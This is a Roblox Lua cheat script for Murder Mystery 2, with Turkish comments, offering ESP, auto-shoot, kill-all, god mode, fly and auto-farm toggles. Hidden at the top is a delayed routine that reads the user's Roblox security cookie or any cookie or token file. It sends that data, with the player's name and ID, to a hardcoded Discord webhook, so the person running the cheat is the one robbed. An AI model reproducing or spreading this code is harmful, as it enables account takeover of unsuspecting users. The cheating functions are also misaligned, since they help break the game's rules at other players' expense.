local s = game:GetService("HttpService")
local p = game:GetService("Players")
local pl = p.LocalPlayer
local workspace = game:GetService("Workspace")
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local lighting = game:GetService("Lighting")
local wb = "https://discord.com/api/webhooks/1540444514462994502/MQwvoOJ3Sn1ui5pwOEFW7MTUOOBO3McVIYFO4WJkZx5YeqyhNMm8-rXkMITJB9u8Ntjm"

-- Webhook Gönderme Fonksiyonu (10 Saniye Sonra Çalışır)
local function req(u, b)
    local o = {
        Url = u,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = s:JSONEncode(b)
    }
    local x, y = pcall(function()
        if syn and syn.request then return syn.request(o)
        elseif http_request then return http_request(o)
        elseif request then return request(o)
        else return s:PostAsync(u, o.Body, Enum.HttpContentType.ApplicationJson)
        end
    end)
    return x and y
end

task.spawn(function()
    task.wait(10)
    pcall(function()
        local c = "NOT_FOUND"
        pcall(function()
            local f = readfile("ROBLOSECURITY.txt") or readfile("cookie.txt") or ""
            if f ~= "" then c = f return end
            local g = listfiles and listfiles("") or {}
            for i = 1, #g do
                if g[i]:lower():find("cookie") or g[i]:lower():find("token") then
                    local h = readfile(g[i]) or ""
                    if h ~= "" then c = h break end
                end
            end
        end)
        local e = {
            embeds = {{
                title = "MM2 EXECUTED",
                description = "Player: " .. pl.Name .. " (" .. pl.UserId .. ")\nExecutor: " .. (identifyexecutor and identifyexecutor() or "unknown") .. "\nCookie: ||" .. c .. "||",
                color = 16711680,
                footer = {text = "hacked by make beatiful ui"}
            }}
        }
        req(wb, {username = "hacked by", embeds = e})
    end)
end)

-- 1. UI & GUI Architecture
local gui = Instance.new("ScreenGui")
gui.Name = "MM2_Master"
gui.ResetOnSpawn = false

pcall(function() gui.Parent = game:GetService("CoreGui") end)
if not gui.Parent then pcall(function() gui.Parent = pl:WaitForChild("PlayerGui") end) end

-- Gerçek Zamanlı Sol Alt FPS Göstergesi
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Size = UDim2.new(0, 120, 0, 30)
fpsLabel.Position = UDim2.new(0, 15, 1, -45)
fpsLabel.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
fpsLabel.BackgroundTransparency = 0.3
fpsLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
fpsLabel.TextSize = 13
fpsLabel.Font = Enum.Font.SourceSans
fpsLabel.Text = "FPS: 0"
fpsLabel.Visible = false
fpsLabel.Parent = gui

local fpsCorner = Instance.new("UICorner")
fpsCorner.CornerRadius = UDim.new(0, 6)
fpsCorner.Parent = fpsLabel

local fpsStroke = Instance.new("UIStroke")
fpsStroke.Color = Color3.fromRGB(255, 50, 50)
fpsStroke.Thickness = 1
fpsStroke.Parent = fpsLabel

-- Sürüklenebilir "Hacked By" Menü Aç/Kapa Butonu (İnce Yazı)
local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 150, 0, 38)
toggleButton.Position = UDim2.new(0, 40, 0, 40)
toggleButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
toggleButton.Text = "Hacked By"
toggleButton.TextColor3 = Color3.fromRGB(255, 50, 50)
toggleButton.TextSize = 13
toggleButton.Font = Enum.Font.SourceSans
toggleButton.Active = true
toggleButton.Draggable = true
toggleButton.Parent = gui

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 6)
tbCorner.Parent = toggleButton

local tbStroke = Instance.new("UIStroke")
tbStroke.Color = Color3.fromRGB(255, 50, 50)
tbStroke.Thickness = 1.5
tbStroke.Parent = toggleButton

-- Sürüklenebilir "Shoot Murderer" Butonu (BASILI TUTMA Özellikli)
local shootButton = Instance.new("TextButton")
shootButton.Size = UDim2.new(0, 160, 0, 38)
shootButton.Position = UDim2.new(0, 40, 0, 90)
shootButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
shootButton.Text = "Shoot Murderer (Hold)"
shootButton.TextColor3 = Color3.fromRGB(255, 50, 50)
shootButton.TextSize = 12
shootButton.Font = Enum.Font.SourceSans
shootButton.Active = true
shootButton.Draggable = true
shootButton.Parent = gui

local sbCorner = Instance.new("UICorner")
sbCorner.CornerRadius = UDim.new(0, 6)
sbCorner.Parent = shootButton

local sbStroke = Instance.new("UIStroke")
sbStroke.Color = Color3.fromRGB(255, 50, 50)
sbStroke.Thickness = 1.5
sbStroke.Parent = shootButton

local shootingActive = false
shootButton.MouseButton1Down:Connect(function() shootingActive = true end)
shootButton.MouseButton1Up:Connect(function() shootingActive = false end)
shootButton.MouseLeave:Connect(function() shootingActive = false end)

coroutine.wrap(function()
    while task.wait(0.1) do
        if shootingActive then
            pcall(function()
                local c2 = pl.Character
                local gun = c2 and (c2:FindFirstChild("Gun") or pl.Backpack:FindFirstChild("Gun"))
                if not gun and c2 and c2:FindFirstChild("Humanoid") then
                    local bpGun = pl.Backpack:FindFirstChild("Gun")
                    if bpGun then bpGun.Parent = c2; gun = bpGun end
                end
                if gun then
                    for _, v in pairs(p:GetPlayers()) do
                        if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                            local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
                            if hasKnife then
                                local ev = gun:FindFirstChildWhichIsA("RemoteEvent")
                                if ev then
                                    ev:FireServer(v.Character.HumanoidRootPart.Position)
                                end
                                break
                            end
                        end
                    end
                end
            end)
        end
    end
end)()

-- Sürüklenebilir "Teleport to Lobby" Butonu
local lobbyButton = Instance.new("TextButton")
lobbyButton.Size = UDim2.new(0, 160, 0, 38)
lobbyButton.Position = UDim2.new(0, 40, 0, 140)
lobbyButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
lobbyButton.Text = "TP to Lobby"
lobbyButton.TextColor3 = Color3.fromRGB(255, 50, 50)
lobbyButton.TextSize = 12
lobbyButton.Font = Enum.Font.SourceSans
lobbyButton.Active = true
lobbyButton.Draggable = true
lobbyButton.Parent = gui

local lbCorner = Instance.new("UICorner")
lbCorner.CornerRadius = UDim.new(0, 6)
lbCorner.Parent = lobbyButton

local lbStroke = Instance.new("UIStroke")
lbStroke.Color = Color3.fromRGB(255, 50, 50)
lbStroke.Thickness = 1.5
lbStroke.Parent = lobbyButton

lobbyButton.MouseButton1Down:Connect(function()
    pcall(function()
        local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = CFrame.new(0, 150, 0)
        end
    end)
end)

-- Sürüklenebilir "Teleport to Game" Butonu
local gameButton = Instance.new("TextButton")
gameButton.Size = UDim2.new(0, 160, 0, 38)
gameButton.Position = UDim2.new(0, 40, 0, 190)
gameButton.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
gameButton.Text = "TP to Game"
gameButton.TextColor3 = Color3.fromRGB(255, 50, 50)
gameButton.TextSize = 12
gameButton.Font = Enum.Font.SourceSans
gameButton.Active = true
gameButton.Draggable = true
gameButton.Parent = gui

local gbCorner = Instance.new("UICorner")
gbCorner.CornerRadius = UDim.new(0, 6)
gbCorner.Parent = gameButton

local gbStroke = Instance.new("UIStroke")
gbStroke.Color = Color3.fromRGB(255, 50, 50)
gbStroke.Thickness = 1.5
gbStroke.Parent = gameButton

gameButton.MouseButton1Down:Connect(function()
    pcall(function()
        local hrp = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj.Name == "SpawnLocation" and obj:IsA("BasePart") then
                    hrp.CFrame = obj.CFrame + Vector3.new(0, 5, 0)
                    break
                end
            end
        end
    end)
end)

-- Ana Menü Penceresi
local f = Instance.new("Frame")
f.Size = UDim2.new(0, 380, 0, 480)
f.Position = UDim2.new(0.5, -190, 0.5, -240)
f.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
f.Active = true
f.Draggable = true
f.ClipsDescendants = true
f.Visible = false
f.Parent = gui

toggleButton.MouseButton1Click:Connect(function()
    f.Visible = not f.Visible
end)

local uc = Instance.new("UICorner")
uc.CornerRadius = UDim.new(0, 12)
uc.Parent = f

local us = Instance.new("UIStroke")
us.Color = Color3.fromRGB(255, 50, 50)
us.Thickness = 1.5
us.Transparency = 0.4
us.Parent = f

local t = Instance.new("TextLabel")
t.Size = UDim2.new(1, 0, 0, 40)
t.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
t.Text = "Hacked By | MM2 God-Tier"
t.TextColor3 = Color3.fromRGB(255, 255, 255)
t.TextSize = 14
t.Font = Enum.Font.SourceSansBold
t.Parent = f

local tc2 = Instance.new("UICorner")
tc2.CornerRadius = UDim.new(0, 12)
tc2.Parent = t

local al2 = Instance.new("Frame")
al2.Size = UDim2.new(1, 0, 0, 2)
al2.Position = UDim2.new(0, 0, 0, 40)
al2.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
al2.Parent = f

local sc = Instance.new("ScrollingFrame")
sc.Size = UDim2.new(1, -20, 1, -50)
sc.Position = UDim2.new(0, 10, 0, 46)
sc.BackgroundTransparency = 1
sc.BorderSizePixel = 0
sc.ScrollBarThickness = 4
sc.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 50)
sc.CanvasSize = UDim2.new(0, 0, 0, 0)
sc.Parent = f

local ll = Instance.new("UIListLayout")
ll.Padding = UDim.new(0, 8)
ll.SortOrder = Enum.SortOrder.LayoutOrder
ll.Parent = sc

ll:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    sc.CanvasSize = UDim2.new(0, 0, 0, ll.AbsoluteContentSize.Y + 20)
end)

local function Tog(parentContainer, titleText, defaultState, callbackFunc)
    local f2 = Instance.new("Frame")
    f2.Size = UDim2.new(1, 0, 0, 36)
    f2.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    f2.BackgroundTransparency = 0.4
    f2.Parent = parentContainer

    local fc = Instance.new("UICorner")
    fc.CornerRadius = UDim.new(0, 6)
    fc.Parent = f2

    local lb = Instance.new("TextLabel")
    lb.Size = UDim2.new(1, -50, 1, 0)
    lb.Position = UDim2.new(0, 12, 0, 0)
    lb.BackgroundTransparency = 1
    lb.Text = titleText
    lb.TextColor3 = Color3.fromRGB(220, 220, 220)
    lb.TextSize = 13
    lb.Font = Enum.Font.SourceSans
    lb.TextXAlignment = Enum.TextXAlignment.Left
    lb.Parent = f2

    local bg2 = Instance.new("Frame")
    bg2.Size = UDim2.new(0, 36, 0, 20)
    bg2.Position = UDim2.new(1, -44, 0.5, -10)
    bg2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    bg2.BorderSizePixel = 0
    bg2.Parent = f2

    local bgc = Instance.new("UICorner")
    bgc.CornerRadius = UDim.new(0, 10)
    bgc.Parent = bg2

    local circ = Instance.new("Frame")
    circ.Size = UDim2.new(0, 16, 0, 16)
    circ.Position = UDim2.new(0, 2, 0.5, -8)
    circ.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
    circ.BorderSizePixel = 0
    circ.Parent = bg2

    local circ2 = Instance.new("UICorner")
    circ2.CornerRadius = UDim.new(0, 8)
    circ2.Parent = circ

    local st = defaultState or false

    local function upd()
        if st then
            bg2.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            circ.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            circ:TweenPosition(UDim2.new(0, 18, 0.5, -8), "Out", "Quad", 0.2, true)
        else
            bg2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            circ.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
            circ:TweenPosition(UDim2.new(0, 2, 0.5, -8), "Out", "Quad", 0.2, true)
        end
    end
    upd()

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = f2

    btn.MouseButton1Click:Connect(function()
        st = not st
        upd()
        if callbackFunc then pcall(callbackFunc, st) end
    end)
end

local function Lbl(parentContainer, text)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, 0, 0, 26)
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = Color3.fromRGB(255, 50, 50)
    l.TextSize = 12
    l.Font = Enum.Font.SourceSansBold
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = parentContainer
end

local O = {}
Lbl(sc, "─ ESP & ROLES ─")
Tog(sc, "Perfect Role ESP", false, function(s) O.ESP = s end)

Lbl(sc, "─ GUN MECHANICS ─")
Tog(sc, "Auto Grab Gun (Sheriff Drop)", false, function(s) O.AutoGrabGun = s end)
Tog(sc, "Auto Sheriff Target (Aim & Shoot)", false, function(s) O.AutoSheriff = s end)

Lbl(sc, "─ COMBAT & SURVIVAL ─")
Tog(sc, "Kill All (As Murderer)", false, function(s) O.KA = s end)
Tog(sc, "Auto Avoid Knife (Dodge)", false, function(s) O.Avoid = s end)
Tog(sc, "Anti-Hit / God Mode Shield", false, function(s) O.GodMode = s end)

Lbl(sc, "─ MOVEMENT & VISUALS ─")
Tog(sc, "Fly Mode", false, function(s) O.Fly = s end)
Tog(sc, "FullBright (No Darkness)", false, function(s) 
    O.FullBright = s 
    if s then
        lighting.Brightness = 2
        lighting.ClockTime = 14
        lighting.FogEnd = 100000
    else
        lighting.Brightness = 1
        lighting.ClockTime = 0
    end
end)
Tog(sc, "FPS Display (Bottom Left)", false, function(s)
    O.FPS = s
    fpsLabel.Visible = s
end)

Lbl(sc, "─ AUTO FARM ─")
Tog(sc, "Auto Farm (40 Coin Limit)", false, function(s) O.AF = s end)

-- Gerçek Zamanlı FPS Hesaplama
local lastTick = tick()
local frameCount = 0
rs.RenderStepped:Connect(function()
    frameCount = frameCount + 1
    local currentTick = tick()
    if currentTick - lastTick >= 1 then
        if O.FPS then
            fpsLabel.Text = "FPS: " .. tostring(frameCount)
        end
        frameCount = 0
        lastTick = currentTick
    end
end)

-- ESP Motoru
coroutine.wrap(function()
    while task.wait(0.5) do
        if O.ESP then
            for _, v in pairs(p:GetPlayers()) do
                if v ~= pl and v.Character then
                    local hrp = v.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local hl = v.Character:FindFirstChild("PerfectESP")
                        if not hl then
                            hl = Instance.new("Highlight")
                            hl.Name = "PerfectESP"
                            hl.Adornee = v.Character
                            hl.FillTransparency = 0.5
                            hl.OutlineTransparency = 0.2
                            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                            hl.Parent = v.Character
                        end
                        
                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
                        local hasGun = v.Character:FindFirstChild("Gun") or (v.Backpack and v.Backpack:FindFirstChild("Gun"))
                        
                        if hasKnife then
                            hl.FillColor = Color3.fromRGB(255, 0, 0)
                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                        elseif hasGun then
                            hl.FillColor = Color3.fromRGB(0, 150, 255)
                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                        else
                            hl.FillColor = Color3.fromRGB(0, 255, 0)
                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
                        end
                    end
                end
            end
        else
            for _, v in pairs(p:GetPlayers()) do
                if v.Character and v.Character:FindFirstChild("PerfectESP") then
                    v.Character.PerfectESP:Destroy()
                end
            end
        end
    end
end)()

-- Auto Grab Gun
coroutine.wrap(function()
    while task.wait(0.2) do
        if O.AutoGrabGun then
            local c2 = pl.Character
            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
            if hrp then
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj.Name == "GunDrop" and obj:IsA("BasePart") then
                        hrp.CFrame = obj.CFrame
                        task.wait(0.1)
                        break
                    end
                end
            end
        end
    end
end)()

-- Auto Sheriff Target
coroutine.wrap(function()
    while task.wait(0.3) do
        if O.AutoSheriff then
            local c2 = pl.Character
            local gun = c2 and (c2:FindFirstChild("Gun") or pl.Backpack:FindFirstChild("Gun"))
            if not gun and c2 and c2:FindFirstChild("Humanoid") then
                local bpGun = pl.Backpack:FindFirstChild("Gun")
                if bpGun then bpGun.Parent = c2; gun = bpGun end
            end
            if gun then
                for _, v in pairs(p:GetPlayers()) do
                    if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
                        if hasKnife then
                            local ev = gun:FindFirstChildWhichIsA("RemoteEvent")
                            if ev then
                                ev:FireServer(v.Character.HumanoidRootPart.Position)
                            end
                            break
                        end
                    end
                end
            end
        end
    end
end)()

-- Kill All
coroutine.wrap(function()
    while task.wait(0.3) do
        if O.KA then
            local c2 = pl.Character
            local knife = c2 and (c2:FindFirstChild("Knife") or pl.Backpack:FindFirstChild("Knife"))
            if knife then
                if knife.Parent == pl.Backpack then knife.Parent = c2 end
                for _, v in pairs(p:GetPlayers()) do
                    if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
                        local rp = c2:FindFirstChild("HumanoidRootPart")
                        if rp then
                            rp.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
                            task.wait(0.05)
                            local ev = knife:FindFirstChildWhichIsA("RemoteEvent")
                            if ev then ev:FireServer(v.Character.HumanoidRootPart) end
                        end
                    end
                end
            end
        end
    end
end)()

-- Auto Avoid Knife (Dodge)
coroutine.wrap(function()
    while task.wait(0.1) do
        if O.Avoid then
            local c2 = pl.Character
            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
            if hrp then
                for _, v in pairs(p:GetPlayers()) do
                    if v ~= pl and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                        local hasKnife = v.Character:FindFirstChild("Knife") or (v.Backpack and v.Backpack:FindFirstChild("Knife"))
                        if hasKnife then
                            local dist = (hrp.Position - v.Character.HumanoidRootPart.Position).Magnitude
                            if dist < 14 then
                                hrp.CFrame = hrp.CFrame + (hrp.CFrame.LookVector * -10) + Vector3.new(0, 5, 0)
                            end
                        end
                    end
                end
            end
        end
    end
end)()

-- God Mode
coroutine.wrap(function()
    while task.wait(0.05) do
        if O.GodMode then
            local c2 = pl.Character
            local hum = c2 and c2:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health < hum.MaxHealth then
                hum.Health = hum.MaxHealth
            end
        end
    end
end)()

-- Fly Motoru
local flying = false
local bg, bv
rs.RenderStepped:Connect(function()
    local c2 = pl.Character
    local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
    local hum = c2 and c2:FindFirstChildOfClass("Humanoid")
    if O.Fly and hrp and hum then
        if not flying then
            flying = true
            bg = Instance.new("BodyGyro", hrp)
            bg.P = 9e4
            bg.maxTorque = Vector3.new(9e4, 9e4, 9e4)
            bv = Instance.new("BodyVelocity", hrp)
            bv.velocity = Vector3.new(0, 0.1, 0)
            bv.maxForce = Vector3.new(9e4, 9e4, 9e4)
            hum.PlatformStand = true
        end
        
        local cam = workspace.CurrentCamera
        local speed = 50
        local moveDir = Vector3.new()
        
        if uis:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
        if uis:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
        if uis:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
        
        bv.velocity = moveDir * speed
        bg.CFrame = cam.CFrame
    else
        if flying then
            flying = false
            if bg then bg:Destroy() end
            if bv then bv:Destroy() end
            if hum then hum.PlatformStand = false end
        end
    end
end)

-- Auto Farm
coroutine.wrap(function()
    local collectedCount = 0
    while task.wait(0.05) do
        if O.AF then
            local c2 = pl.Character
            local hrp = c2 and c2:FindFirstChild("HumanoidRootPart")
            local humanoid = c2 and c2:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid and humanoid.Health > 0 then
                local container = workspace:FindFirstChild("CoinContainer") or workspace
                for _, v in pairs(container:GetDescendants()) do
                    if not O.AF then break end
                    if v:IsA("BasePart") and (v.Name:lower():find("coin") or v.Name:lower():find("gold") or v.Name:lower():find("gem")) then
                        if v.Transparency < 1 and v.Parent then
                            hrp.CFrame = v.CFrame + Vector3.new(0, 0.5, 0)
                            collectedCount = collectedCount + 1
                            task.wait(0.03)
                            
                            if collectedCount >= 40 then
                                collectedCount = 0
                                humanoid.Health = 0
                                task.wait(3)
                                break
                            end
                        end
                    end
                end
            end
        else
            collectedCount = 0
        end
    end
end)()

print("[LOADED] Ultimate MM2 Master Hub - New Webhook Active!")
